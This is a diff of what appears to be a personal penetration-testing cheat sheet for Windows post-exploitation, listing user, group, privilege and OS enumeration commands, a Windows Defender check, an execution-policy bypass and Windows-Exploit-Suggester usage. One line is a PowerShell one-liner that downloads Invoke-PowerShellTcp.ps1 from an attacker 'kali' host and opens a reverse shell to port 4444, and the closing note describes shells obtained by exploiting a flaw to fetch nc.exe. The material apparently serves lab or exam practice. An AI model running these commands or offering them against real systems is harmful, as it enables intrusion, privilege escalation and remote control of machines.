@@ -2,12 +2,20 @@
 
 whoami /all     # current user, SIDs, groups, privileges, and integrity level
 whoami /priv    # SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, SeRestorePrivilege, SeLoadDriverPrivilege, SeManageVolumePrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeSystemEnvironmentPrivilege, SeShutdownPrivilege, SeEnableDelegationPrivilege, SeCreateTokenPrivilege
+whoami /groups    # (shows group SIDs); look for high-priv groups like INTERACTIVE or SERVICE.
+net users    # List local users
+net localgroup    # Lists groups, Check if in any interesting groups like "Remote Desktop Users".
+net localgroup administrators    # View members of administrators group
+net accounts    # Domain/local policy
+
 echo %username% && hostname && pwd    # user, machine name, and current working dir
+ver    # Quick version string (e.g., "Microsoft Windows [Version 10.0.19041.928]")
+wmic os get Caption, OSArchitecture, LastBootUpTime    # OS details and uptime (long uptime might mean unpatched).
 systeminfo      # Ronseal
 systeminfo | findstr /C:"Domain"      # Check if Domain joined
 powershell -ep bypass    # Switch to PowerShell with execution policy bypassed for better scripting/interactivity
-//If PS unstable// powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress kali_ip -Port 4444"`. (Upload script first if needed.)
-
+  //If PS unstable// powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress kali_ip -Port 4444"`. (Upload script first if needed.)
+sc query windefend    # Check if Win Defender is running
 systeminfo > sysinfo.txt    # Dump systeminfo to file and review in Windows-Exploit-Suggester
   python3 wes.py --update    # Update Windows-Exploit-Suggester
   python3 wes.py sysinfo.txt    # Basic command for Windows-Exploit-Suggester
@@ -23,6 +31,8 @@ systeminfo > sysinfo.txt    # Dump systeminfo to file and review in Windows-Expl
 
 
 
+===============================================================================================================================================================================
+===============================================================================================================================================================================
 
 After getting a reverse shell via Netcat (e.g., exploited vuln to download nc.exe from Kali), stabilize it first, then enumerate methodically. Focus on broad system context before targeted vectors. Document everything in a txt file on my Kali for the report. Iterate based on findings—if something looks vulnerable, exploit it before full enum.
 
